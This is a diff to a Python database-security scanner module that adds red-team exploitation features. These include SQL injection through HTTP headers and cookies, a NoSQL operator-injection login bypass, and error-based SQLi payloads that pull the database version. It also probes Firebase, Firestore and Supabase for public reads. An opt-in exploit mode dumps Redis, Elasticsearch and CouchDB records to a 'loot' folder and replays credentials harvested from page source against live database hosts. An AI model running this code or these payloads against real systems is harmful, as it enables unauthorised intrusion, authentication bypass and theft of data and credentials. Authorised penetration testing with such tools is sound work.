@@ -12,20 +12,23 @@ destructive checks (default creds, time-based SQLi, NoSQL) and limits the port s
 """
 from __future__ import annotations
 
+import json
 import re
 import socket
 import ssl
 import time
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from dataclasses import dataclass, field
+from pathlib import Path
 from urllib.parse import urlparse
 
 import httpx
 from loguru import logger
 
+from config import PROJECT_ROOT
 from scanner.engine import Finding, Severity, ScanEngine
 from scanner.recon.port_scan import _is_accept_all, _probe_port, _resolve  # reuse connect/banner/accept-all
-from scanner.vulns._common import inject_param, is_safe_mode, iter_injectors
+from scanner.vulns._common import Injector, get, inject_param, is_safe_mode, iter_injectors
 
 MODULE = "db_security"
 
@@ -38,8 +41,36 @@ _DB_PORTS: dict[int, str] = {
 _SAFE_PORTS = (3306, 5432, 1433, 27017, 6379)
 
 # Exposure-score weights (counted once per category that fired).
-_SCORE = {"unauth": 30, "sqli": 25, "default_creds": 20, "creds_leak": 20, "admin_200": 15,
+_SCORE = {"unauth": 30, "cloud_db": 30, "cred_reuse": 30, "sqli": 25, "authbypass": 25,
+          "default_creds": 20, "creds_leak": 20, "admin_200": 15,
           "dump": 10, "nosql": 10, "graphql": 10, "tls": 5, "admin_403": 5}
+
+# MITRE ATT&CK technique per finding category (red-team reporting).
+_ATTACK = {
+    "unauth": "T1190 Exploit Public-Facing Application",
+    "cloud_db": "T1530 Data from Cloud Storage",
+    "sqli": "T1190 Exploit Public-Facing Application",
+    "authbypass": "T1212 Exploitation for Credential Access",
+    "nosql": "T1190 Exploit Public-Facing Application",
+    "graphql": "T1213 Data from Information Repositories",
+    "creds_leak": "T1552.001 Credentials in Files",
+    "default_creds": "T1078.001 Default Accounts",
+    "cred_reuse": "T1078 Valid Accounts",
+    "dump": "T1213 Data from Information Repositories",
+    "admin_200": "T1190 Exploit Public-Facing Application",
+    "admin_403": "T1087 Account Discovery",
+    "extraction": "T1213 Data from Information Repositories",
+}
+
+# Headers an attacker can smuggle injection through (server often logs/queries these).
+_INJECT_HEADERS = ["User-Agent", "Referer", "X-Forwarded-For", "X-Forwarded-Host", "X-Real-IP"]
+
+# Cloud / managed database fingerprints found in page/JS source.
+_FIREBASE_RE = re.compile(r"https?://([a-z0-9-]+)\.firebaseio\.com", re.I)
+_FIREBASE_CFG_RE = re.compile(r"['\"]databaseURL['\"]\s*:\s*['\"]https?://([a-z0-9-]+)\.firebaseio\.com", re.I)
+_SUPABASE_RE = re.compile(r"https?://([a-z0-9]+)\.supabase\.co", re.I)
+_SUPABASE_KEY_RE = re.compile(r"(eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{10,})")
+_FIRESTORE_RE = re.compile(r"firestore\.googleapis\.com/v1/projects/([a-z0-9-]+)", re.I)
 
 # ---------------------------------------------------------------------------
 # SQL injection payloads & error signatures
@@ -136,8 +167,39 @@ _SECRET_CRED_RE = re.compile(
 def _f(title, desc, sev, rec, category, **raw) -> Finding:
     raw["db_category"] = category
     raw.setdefault("confidence", "high")
+    if category in _ATTACK:
+        raw.setdefault("attack", _ATTACK[category])
     return Finding(module=MODULE, title=title, description=desc, severity=sev,
                    recommendation=rec, raw=raw)
+
+
+# ---------------------------------------------------------------------------
+# Evidence on disk (red-team loot) — only written in active (--exploit) mode
+# ---------------------------------------------------------------------------
+
+def _loot_dir(engine: ScanEngine) -> Path:
+    """Create and return loot/<host>_<timestamp>/ for extracted evidence (gitignored)."""
+    host = urlparse(engine.url).hostname or "target"
+    safe_host = re.sub(r"[^A-Za-z0-9_.-]", "_", host)
+    d = PROJECT_ROOT / "loot" / f"{safe_host}_{time.strftime('%Y%m%d_%H%M%S')}"
+    d.mkdir(parents=True, exist_ok=True)
+    return d
+
+
+def _save_evidence(loot: Path | None, name: str, data: "str | bytes") -> str:
+    """Write *data* to loot/<name>, returning the path (or '' if no loot dir)."""
+    if loot is None:
+        return ""
+    safe = re.sub(r"[^A-Za-z0-9_.-]", "_", name)[:80]
+    path = loot / safe
+    try:
+        mode, payload = ("wb", data) if isinstance(data, bytes) else ("w", data)
+        with open(path, mode, encoding=None if "b" in mode else "utf-8") as fh:
+            fh.write(payload)
+        return str(path)
+    except OSError as exc:  # noqa: BLE001
+        logger.debug(f"db_security: could not write evidence {name}: {exc}")
+        return ""
 
 
 # ---------------------------------------------------------------------------
@@ -543,32 +605,170 @@ def _sqli_finding(inj, payload, technique, engine_name) -> Finding:
               "sqli", **extra)
 
 
-def _check_nosql(engine: ScanEngine, safe: bool) -> list[Finding]:
+# ---------------------------------------------------------------------------
+# Expanded surface: SQL injection through HTTP headers & cookies
+# ---------------------------------------------------------------------------
+
+def _header_cookie_injectors(engine: ScanEngine) -> list[Injector]:
+    """Injectors that smuggle the payload through HTTP headers and cookies (no URL proof)."""
+    base_url = engine.url
+    injectors: list[Injector] = [
+        Injector(label=f"HTTP header '{hdr}'", param=hdr,
+                 inject=(lambda payload, h=hdr: get(engine, base_url, headers={h: payload})),
+                 proof=None)
+        for hdr in _INJECT_HEADERS
+    ]
+    # Cookies discovered from a baseline response (server may query them).
+    try:
+        cookie_names = list(engine.request("GET", base_url).cookies.keys())
+    except httpx.HTTPError:
+        cookie_names = []
+    for cname in cookie_names[:5]:
+        injectors.append(Injector(
+            label=f"cookie '{cname}'", param=cname,
+            inject=(lambda payload, c=cname: get(engine, base_url, headers={"Cookie": f"{c}={payload}"})),
+            proof=None))
+    return injectors
+
+
+def _check_injection_headers(engine: ScanEngine, safe: bool) -> list[Finding]:
+    """Reuse the SQLi engine against header/cookie vectors (error/boolean only)."""
     if safe:
         return []
     findings: list[Finding] = []
+    for inj in _header_cookie_injectors(engine):
+        hit = _sqli_one(engine, inj, safe)
+        if hit:
+            findings.append(hit)
+    return findings
+
+
+def _check_nosql(engine: ScanEngine, safe: bool,
+                 skip_params: "set[str] | None" = None) -> list[Finding]:
+    if safe:
+        return []
+    skip_params = skip_params or set()
+    findings: list[Finding] = []
     for inj in iter_injectors(engine):
-        if inj.proof is None:
+        if inj.proof is None or inj.param in skip_params:
             continue
         base = inj.inject("1")
         if base is None:
             continue
+        sql_param = False
+        hit_payload: str | None = None
         for payload in _NOSQL_PAYLOADS:
             resp = inj.inject(payload)
             if resp is None:
                 continue
+            # A SQL error means the parameter is SQL-injectable, not NoSQL — don't double-report.
+            if _detect_sql_error(resp.text):
+                sql_param = True
+                break
             size_delta = abs(len(resp.text) - len(base.text)) / max(len(base.text), 1)
             # Require a status-code change or a large body change to limit false positives.
             if resp.status_code != base.status_code or size_delta > 0.40:
-                findings.append(_f(f"Possible NoSQL Injection: {inj.param}",
-                                   f"Parameter '{inj.param}' changed behaviour for NoSQL operator "
-                                   f"{payload!r} (status/size delta). Verify manually.",
-                                   Severity.CRITICAL,
-                                   "Cast/validate input types; never pass raw user objects to NoSQL queries.",
-                                   "nosql", parameter=inj.param, payload=payload,
-                                   proof_url=inj.proof(payload), confidence="medium"))
+                hit_payload = payload
                 break
+        if sql_param or hit_payload is None:
+            continue
+        findings.append(_f(f"Possible NoSQL Injection: {inj.param}",
+                           f"Parameter '{inj.param}' changed behaviour for NoSQL operator "
+                           f"{hit_payload!r} (status/size delta) with no SQL error. Verify manually.",
+                           Severity.CRITICAL,
+                           "Cast/validate input types; never pass raw user objects to NoSQL queries.",
+                           "nosql", parameter=inj.param, payload=hit_payload,
+                           proof_url=inj.proof(hit_payload), confidence="medium"))
     return findings
+
+
+# Login-failure vs authenticated markers — used to confirm a *real* auth bypass.
+_LOGIN_FAIL_RE = re.compile(
+    r"invalid|incorrect|failed|wrong|denied|not match|bad cred|try again|"
+    r"authentication failed|login failed|does ?n.t exist", re.I)
+_LOGIN_AUTH_RE = re.compile(
+    r"log\s*out|sign\s*out|welcome\b|dashboard|my ?account|your profile|logged ?in", re.I)
+
+
+def _login_success(base: httpx.Response, attempt: "httpx.Response | None") -> bool:
+    """Confirm a NoSQL auth bypass ONLY on a clear failure→success transition.
+
+    Weak signals (a new session cookie, a size change, a redirect) fire on normal frameworks
+    (ASP.NET ViewState, per-request session ids) and caused false positives, so they are not
+    used. We require that the wrong-credentials baseline shows a login failure while the
+    operator-injection attempt no longer does (or shows an authenticated marker the baseline
+    lacked).
+    """
+    if attempt is None or attempt.status_code >= 500:
+        return False
+    base_fail = bool(_LOGIN_FAIL_RE.search(base.text))
+    att_fail = bool(_LOGIN_FAIL_RE.search(attempt.text))
+    if base_fail and not att_fail:
+        return True
+    if _LOGIN_AUTH_RE.search(attempt.text) and not _LOGIN_AUTH_RE.search(base.text):
+        return True
+    return False
+
+
+def _check_nosql_authbypass(engine: ScanEngine, safe: bool) -> list[Finding]:
+    """NoSQL operator-injection auth bypass on POST login forms ({"$ne":""})."""
+    if safe:
+        return []
+    try:
+        crawl = engine.get_crawl()
+    except Exception:  # noqa: BLE001
+        return []
+    findings: list[Finding] = []
+    for form in crawl.forms:
+        if (form.method or "").lower() != "post":
+            continue
+        pw_fields = [f for f in form.fields if "pass" in f.lower()]
+        if not pw_fields:
+            continue
+        # Skip ASP.NET WebForms / other non-NoSQL stacks: a Mongo bypass is impossible there,
+        # and their hidden ViewState fields make the heuristic misfire (false positives).
+        if any(f.lower().startswith("__view") or "eventvalidation" in f.lower()
+               or "csrf" in f.lower() or "requestverificationtoken" in f.lower()
+               for f in form.fields):
+            continue
+        # Inject into the password field(s) plus the first non-password (username) field.
+        user_field = [f for f in form.fields if f not in pw_fields][:1]
+        targets = list(dict.fromkeys([*user_field, *pw_fields]))
+        # Baseline: deliberately wrong credentials.
+        bad = {k: "nonexistent_zzz_" + k for k in form.fields}
+        try:
+            base = engine.request("POST", form.action, data=bad)
+        except httpx.HTTPError:
+            continue
+        # Attempt 1 — urlencoded operator injection (user[$ne]=).
+        data1 = {k: v for k, v in form.fields.items() if k not in targets}
+        for f in targets:
+            data1[f + "[$ne]"] = ""
+        # Attempt 2 — JSON operator injection.
+        body2 = {f: {"$ne": ""} for f in targets}
+        a1 = get_post(engine, form.action, data=data1)
+        a2 = get_post(engine, form.action, json=body2)
+        hit = next(((label, a) for label, a in (("user[$ne]= (urlencoded)", a1),
+                                                ('{"$ne":""} (JSON)', a2))
+                    if _login_success(base, a)), None)
+        if hit:
+            label, _ = hit
+            findings.append(_f(
+                f"NoSQL Authentication Bypass: {form.action}",
+                f"The login form at {form.action} accepted a NoSQL operator-injection payload "
+                f"({label}) and behaved as an authenticated session — credentials were bypassed.",
+                Severity.CRITICAL,
+                "Cast inputs to strings server-side; reject objects/operators in auth queries.",
+                "authbypass", url=form.action, payload=label, proof_url=form.action,
+                confidence="medium", exploit_cmd=f"Replay {label} into the login fields at {form.action}"))
+    return findings
+
+
+def get_post(engine: ScanEngine, url: str, **kwargs) -> "httpx.Response | None":
+    try:
+        return engine.request("POST", url, **kwargs)
+    except httpx.HTTPError:
+        return None
 
 
 # ---------------------------------------------------------------------------
@@ -655,6 +855,249 @@ def _check_framework_leaks(engine: ScanEngine) -> list[Finding]:
                                f"{fw} debug endpoint {url} exposes database configuration/credentials.",
                                Severity.CRITICAL, "Disable debug/actuator endpoints in production.",
                                "unauth", path=path, url=url, framework=fw, proof_url=url))
+    return findings
+
+
+# ---------------------------------------------------------------------------
+# Cloud / managed database exposure (Firebase, Firestore, Supabase)
+# ---------------------------------------------------------------------------
+
+def _check_cloud_db(engine: ScanEngine) -> list[Finding]:
+    """Detect world-readable cloud databases referenced in the site's source."""
+    try:
+        blob = "\n".join(engine.get_crawl().pages.values())
+    except Exception:  # noqa: BLE001
+        return []
+    findings: list[Finding] = []
+
+    # --- Firebase Realtime Database: /.json with no auth returns the whole tree ---
+    projects = set(_FIREBASE_RE.findall(blob)) | set(_FIREBASE_CFG_RE.findall(blob))
+    for proj in list(projects)[:5]:
+        url = f"https://{proj}.firebaseio.com/.json?shallow=true"
+        try:
+            r = engine.request("GET", url, timeout=8.0)
+        except httpx.HTTPError:
+            continue
+        if r.status_code == 200 and r.text.strip() not in ("null", "", "{}"):
+            findings.append(_f(
+                f"Firebase Realtime DB World-Readable: {proj}",
+                f"The Firebase Realtime Database '{proj}' is readable WITHOUT authentication at "
+                f"{url} — every record can be downloaded by anyone.",
+                Severity.CRITICAL,
+                "Set Firebase security rules to deny public read/write and require authentication.",
+                "cloud_db", url=url, project=proj, proof_url=url,
+                exploit_cmd=f"curl 'https://{proj}.firebaseio.com/.json'"))
+
+    # --- Firestore REST: open default database documents ---
+    for proj in list(set(_FIRESTORE_RE.findall(blob)))[:3]:
+        url = f"https://firestore.googleapis.com/v1/projects/{proj}/databases/(default)/documents"
+        try:
+            r = engine.request("GET", url, timeout=8.0)
+        except httpx.HTTPError:
+            continue
+        if r.status_code == 200 and '"documents"' in r.text:
+            findings.append(_f(
+                f"Firestore Documents Publicly Readable: {proj}",
+                f"Firestore project '{proj}' returns documents over the public REST API without "
+                f"authentication ({url}).",
+                Severity.CRITICAL,
+                "Tighten Firestore security rules; deny unauthenticated reads.",
+                "cloud_db", url=url, project=proj, proof_url=url))
+
+    # --- Supabase: anon key in source → advisory (RLS must be enforced) ---
+    sup_projects = set(_SUPABASE_RE.findall(blob))
+    if sup_projects and _SUPABASE_KEY_RE.search(blob):
+        proj = list(sup_projects)[0]
+        findings.append(_f(
+            f"Supabase Project Exposed: {proj}",
+            f"A Supabase project '{proj}.supabase.co' and an anon API key are embedded in the "
+            "site source. This is by design, but ONLY safe if Row-Level Security is enforced on "
+            "every table — otherwise the anon key reads/writes all data.",
+            Severity.MEDIUM,
+            "Verify Row-Level Security is enabled and restrictive on all Supabase tables.",
+            "cloud_db", project=proj, confidence="medium",
+            exploit_cmd=f"curl 'https://{proj}.supabase.co/rest/v1/<table>?apikey=<anon_key>&select=*'"))
+    return findings
+
+
+# ---------------------------------------------------------------------------
+# Active extraction (gated by --exploit) — turns detection into proof of impact
+# ---------------------------------------------------------------------------
+
+def _redis_value(host: str, port: int, key: str) -> str:
+    """Best-effort read of one Redis key's value (type-aware)."""
+    kb = key.encode("latin-1", "replace")
+    typ = _tcp_send_recv(host, port, b"TYPE " + kb + b"\r\n")
+    if b"+string" in typ:
+        raw = _tcp_send_recv(host, port, b"GET " + kb + b"\r\n")
+    elif b"+hash" in typ:
+        raw = _tcp_send_recv(host, port, b"HGETALL " + kb + b"\r\n")
+    elif b"+list" in typ:
+        raw = _tcp_send_recv(host, port, b"LRANGE " + kb + b" 0 20\r\n")
+    elif b"+set" in typ:
+        raw = _tcp_send_recv(host, port, b"SMEMBERS " + kb + b"\r\n")
+    else:
+        raw = _tcp_send_recv(host, port, b"GET " + kb + b"\r\n")
+    return raw.decode("latin-1", "replace")
+
+
+def _exploit_redis(host: str, port: int, sample_keys: list[str], loot: Path | None) -> list[Finding]:
+    """Dump sample Redis key VALUES as evidence (proof an attacker reads the data)."""
+    if not sample_keys:
+        return []
+    dump_lines = []
+    for key in sample_keys[:10]:
+        val = _redis_value(host, port, key)
+        dump_lines.append(f"### {key}\n{val.strip()[:500]}")
+    dump = "\n\n".join(dump_lines)
+    evidence = _save_evidence(loot, f"redis_{host}_{port}.txt", dump)
+    return [_f(f"Redis Data Extracted: {host}:{port}",
+               f"Read the actual values of {len(sample_keys[:10])} Redis key(s) without auth — "
+               "concrete proof the data is fully exposed.",
+               Severity.CRITICAL, "Require AUTH and firewall the port immediately.",
+               "extraction", host=host, port=port, engine="Redis",
+               redis_values=dump_lines[:5], evidence_file=evidence)]
+
+
+def _exploit_http_json(engine: ScanEngine, label: str, url: str, host: str, port: int,
+                       loot: Path | None) -> list[Finding]:
+    """GET a JSON data endpoint (ES _search / CouchDB _all_docs) and save sample records."""
+    try:
+        r = engine.request("GET", url, timeout=8.0)
+    except httpx.HTTPError:
+        return []
+    if r.status_code != 200 or not r.text.strip():
+        return []
+    evidence = _save_evidence(loot, f"{label}_{host}_{port}.json", r.text[:20000])
+    return [_f(f"{label} Data Extracted: {host}:{port}",
+               f"Pulled sample records from {url} without authentication.",
+               Severity.CRITICAL, "Enable authentication and restrict network access.",
+               "extraction", host=host, port=port, engine=label, url=url,
+               evidence_file=evidence)]
+
+
+def _extend_first_scheme(findings: list[Finding], engine: ScanEngine, label: str,
+                         host: str, port: int, path: str, loot: Path | None) -> None:
+    """Try http then https for a JSON data endpoint; append the first successful extraction."""
+    for scheme in ("http", "https"):
+        try:
+            got = _exploit_http_json(engine, label, f"{scheme}://{host}:{port}{path}",
+                                     host, port, loot)
+        except Exception as exc:  # noqa: BLE001
+            logger.debug(f"db_security: extract {label} {scheme} failed: {exc}")
+            got = []
+        if got:
+            findings.extend(got)
+            return
+
+
+# In-band SQLi data extraction: (error-marker regex, payloads that trigger it).
+_SQLI_EXTRACT = [
+    (re.compile(r"~([^~]+)~"), [
+        "1 AND extractvalue(1,concat(0x7e,version(),0x7e))",
+        "' AND extractvalue(1,concat(0x7e,version(),0x7e))-- -",
+        "1' AND extractvalue(1,concat(0x7e,version(),0x7e))-- -"]),
+    (re.compile(r"converting the \w+ value '([^']+)", re.I), [
+        "1 AND 1=convert(int,@@version)--",
+        "' AND 1=convert(int,@@version)-- -"]),
+    (re.compile(r"invalid input syntax for (?:type )?integer: \"([^\"]+)", re.I), [
+        "1 AND 1=cast(version() as int)--",
+        "' AND 1=cast(version() as int)-- -"]),
+]
+
+
+def _sqli_extract(inj) -> str:
+    """Best-effort in-band extraction of the DB version via error-based payloads."""
+    for rx, payloads in _SQLI_EXTRACT:
+        for p in payloads:
+            resp = inj.inject(p)
+            if resp is None:
+                continue
+            m = rx.search(resp.text)
+            if m:
+                return m.group(1).strip()[:200]
+    return ""
+
+
+def _exploit_sqli(engine: ScanEngine, loot: Path | None) -> list[Finding]:
+    """For each confirmed SQLi, attempt a lightweight in-band version pull as proof."""
+    findings: list[Finding] = []
+    for inj in iter_injectors(engine):
+        if _sqli_one(engine, inj, safe=False) is None:
+            continue
+        fingerprint = _sqli_extract(inj)
+        if not fingerprint:
+            continue
+        evidence = _save_evidence(loot, f"sqli_{inj.param}.txt",
+                                  f"parameter: {inj.param}\nurl: {inj.url}\nDB version: {fingerprint}\n")
+        findings.append(_f(
+            f"SQLi Data Extracted (in-band): {inj.param}",
+            f"Extracted the live database banner through parameter '{inj.param}' without sqlmap: "
+            f"{fingerprint!r}. Full dump available via --exploit (sqlmap).",
+            Severity.CRITICAL, "Use parameterised queries.",
+            "extraction", parameter=inj.param, sql_fingerprint=fingerprint,
+            url=inj.url, evidence_file=evidence))
+    return findings
+
+
+# Harvested DB credentials from connection strings: scheme://user:pass@host:port
+_HARVEST_RE = re.compile(
+    r"(mysql|mariadb|postgres(?:ql)?|mongodb(?:\+srv)?|redis)://([^:@/\s]+):([^@/\s]+)@"
+    r"([^:/\s]+)(?::(\d+))?", re.I)
+
+
+def _harvest_credentials(engine: ScanEngine) -> list[tuple]:
+    """Pull (scheme, user, pass, host, port) tuples from connection strings in page source."""
+    try:
+        blob = "\n".join(engine.get_crawl().pages.values())
+    except Exception:  # noqa: BLE001
+        return []
+    out, seen = [], set()
+    for scheme, user, pwd, host, port in _HARVEST_RE.findall(blob):
+        key = (user, pwd, host, port)
+        if key in seen:
+            continue
+        seen.add(key)
+        out.append((scheme.lower(), user, pwd, host, int(port) if port else 0))
+    return out
+
+
+def _try_db_login(scheme: str, user: str, pwd: str, host: str, port: int) -> bool:
+    """Attempt a real connection with harvested credentials (optional drivers; graceful)."""
+    try:
+        if scheme.startswith(("mysql", "maria")):
+            import pymysql  # type: ignore  # noqa: PLC0415
+            pymysql.connect(host=host, port=port or 3306, user=user, password=pwd,
+                            connect_timeout=4).close()
+            return True
+        if scheme.startswith("postgres"):
+            import psycopg2  # type: ignore  # noqa: PLC0415
+            psycopg2.connect(host=host, port=port or 5432, user=user, password=pwd,
+                             connect_timeout=4).close()
+            return True
+        if scheme.startswith("redis"):
+            resp = _tcp_send_recv(host, port or 6379, f"AUTH {user} {pwd}\r\n".encode("latin-1"))
+            return b"+OK" in resp
+    except ImportError:
+        logger.debug(f"db_security: no driver to reuse creds for {scheme}")
+    except Exception as exc:  # noqa: BLE001
+        logger.debug(f"db_security: cred-reuse {scheme}://{host} failed: {exc}")
+    return False
+
+
+def _exploit_cred_reuse(engine: ScanEngine) -> list[Finding]:
+    """Replay credentials harvested from the site against their own database hosts."""
+    findings: list[Finding] = []
+    for scheme, user, pwd, host, port in _harvest_credentials(engine):
+        if _try_db_login(scheme, user, pwd, host, port):
+            findings.append(_f(
+                f"Credential Reuse — Harvested Creds Open {scheme.upper()}: {host}",
+                f"Credentials leaked in the site source ({user}:***@{host}) successfully "
+                f"authenticated to the live {scheme} database — full access confirmed.",
+                Severity.CRITICAL,
+                "Rotate the exposed credentials and remove them from client-side code.",
+                "cred_reuse", host=host, port=port, engine=scheme,
+                reused_credential=f"{user}:***", confidence="high"))
     return findings
 
 
@@ -763,9 +1206,14 @@ def run(engine: ScanEngine) -> list[Finding]:
         # TLS
         guard(_check_tls, ip, op.port)
 
-    # Injection surface (HTTP)
+    # Injection surface (HTTP) — params, forms, and now headers/cookies
     guard(_check_sqli, engine, safe)
-    guard(_check_nosql, engine, safe)
+    guard(_check_injection_headers, engine, safe)   # SQLi via User-Agent/Referer/XFF/cookies
+    # Skip NoSQL flagging on params already confirmed SQL-injectable (avoids double-reporting).
+    sqli_params = {f.raw.get("parameter") for f in findings
+                   if f.raw.get("db_category") == "sqli" and f.raw.get("parameter")}
+    guard(_check_nosql, engine, safe, sqli_params)
+    guard(_check_nosql_authbypass, engine, safe)     # operator-injection login bypass
 
     catch_all = False
     try:
@@ -778,13 +1226,35 @@ def run(engine: ScanEngine) -> list[Finding]:
     guard(_check_secret_files, engine, catch_all)   # .env / database.yml / my.cnf credential leak
     guard(_check_connstrings, engine)        # hardcoded DB credentials in page/JS source
     guard(_check_graphql, engine)            # GraphQL introspection / schema disclosure
+    guard(_check_cloud_db, engine)           # Firebase / Firestore / Supabase exposure
+
+    # --- Active exploitation (opt-in via --exploit): prove impact by extracting data ---
+    active = bool(getattr(engine, "exploit", False)) and not safe
+    if active:
+        loot = _loot_dir(engine)
+        for f in list(findings):
+            if f.raw.get("db_category") != "unauth":
+                continue
+            host, port, eng = f.raw.get("host"), f.raw.get("port"), f.raw.get("engine")
+            if eng == "Redis" and f.raw.get("sample_keys") and host and port:
+                guard(_exploit_redis, host, port, f.raw["sample_keys"], loot)
+            elif eng == "Elasticsearch" and host and port:
+                _extend_first_scheme(findings, engine, "Elasticsearch", host, port,
+                                     "/_search?size=10", loot)
+            elif eng == "CouchDB" and f.raw.get("databases") and host and port:
+                db0 = f.raw["databases"][0]
+                _extend_first_scheme(findings, engine, "CouchDB", host, port,
+                                     f"/{db0}/_all_docs?include_docs=true&limit=10", loot)
+        guard(_exploit_sqli, engine, loot)        # in-band SQLi version extraction
+        guard(_exploit_cred_reuse, engine)        # replay harvested creds against DB hosts
 
     # Exposure score
     score, grade = _exposure_score(findings)
     findings.append(_f(f"DB Exposure Score: {score}/100 ({grade})",
                        f"Database exposure score is {score}/100 — grade {grade}. "
-                       "Computed from open ports, unauthenticated access, injection, admin interfaces, "
-                       "dumps, and TLS posture.",
+                       "Computed from open ports, unauthenticated access, SQL/NoSQL injection "
+                       "(params, forms, headers/cookies, auth-bypass), cloud DB exposure, leaked "
+                       "credentials, admin interfaces, dumps, and TLS posture.",
                        Severity.INFO, "", "score", score=score, grade=grade))
 
     findings.sort(key=lambda f: ["critical", "high", "medium", "low", "info"].index(f.severity.value))
@@ -811,7 +1281,8 @@ def build_playbook(findings: list[Finding]) -> list[dict]:
         if not cmd:
             continue
         plan.append({"severity": f.severity.value, "title": f.title,
-                     "category": f.raw.get("db_category", ""), "command": cmd})
+                     "category": f.raw.get("db_category", ""), "command": cmd,
+                     "attack": f.raw.get("attack", ""), "evidence": f.raw.get("evidence_file", "")})
     return plan
 
 
@@ -837,6 +1308,18 @@ def collect_loot(findings: list[Finding]) -> list[str]:
             loot.append(f"Secret in {r.get('path', 'file')}: " + str(r["secret_match"]))
         if r.get("credential"):
             loot.append(f"Default credentials {r.get('engine', '')}: " + str(r["credential"]))
+        # Actively extracted evidence (--exploit mode)
+        if r.get("redis_values"):
+            loot.append(f"Redis values dumped ({r.get('engine', 'Redis')}): "
+                        + " | ".join(str(v)[:60] for v in r["redis_values"][:3]))
+        if r.get("sql_fingerprint"):
+            loot.append(f"DB banner via SQLi '{r.get('parameter', '?')}': " + str(r["sql_fingerprint"]))
+        if r.get("reused_credential"):
+            loot.append(f"Working reused credential on {r.get('engine', '')}: " + str(r["reused_credential"]))
+        if r.get("project"):
+            loot.append(f"Cloud DB exposed: {r.get('project')}")
+        if r.get("evidence_file"):
+            loot.append(f"Evidence saved: {r['evidence_file']}")
     return loot
 
 
@@ -896,9 +1379,10 @@ def render_panel(findings: list[Finding]) -> None:
         summ.add_column(col, justify="center")
     summ.add_row(
         str(sum(1 for f in db if f.raw.get("db_category") == "open_port")),
-        str(sum(1 for f in db if f.raw.get("db_category") in ("unauth", "default_creds"))),
-        str(sum(1 for f in db if f.raw.get("db_category") == "sqli")),
-        str(sum(1 for f in db if f.raw.get("db_category") in ("creds_leak", "dump", "graphql"))),
+        str(sum(1 for f in db if f.raw.get("db_category") in ("unauth", "default_creds", "cred_reuse"))),
+        str(sum(1 for f in db if f.raw.get("db_category") in ("sqli", "authbypass"))),
+        str(sum(1 for f in db if f.raw.get("db_category")
+                in ("creds_leak", "dump", "graphql", "cloud_db", "extraction"))),
         str(sum(1 for f in db if f.raw.get("db_category") in ("admin_200", "admin_403"))),
     )
 
@@ -920,8 +1404,13 @@ def render_panel(findings: list[Finding]) -> None:
             sev = step["severity"]
             plan_block.append(f"   {i}. ", style="bold white")
             plan_block.append(f"[{sev.upper()}] ", style=_SEV_COLOR.get(sev, "white"))
-            plan_block.append(f"{step['title']}\n", style="white")
+            plan_block.append(f"{step['title']}", style="white")
+            if step.get("attack"):
+                plan_block.append(f"  ⟦{step['attack']}⟧", style="magenta")
+            plan_block.append("\n")
             plan_block.append(f"      $ {step['command']}\n", style="bold cyan")
+            if step.get("evidence"):
+                plan_block.append(f"      ⧉ evidence: {step['evidence']}\n", style="green")
 
     console.print()
     console.print(Panel(Group(lines, Text(), bar, Text(), summ, loot_block, plan_block),
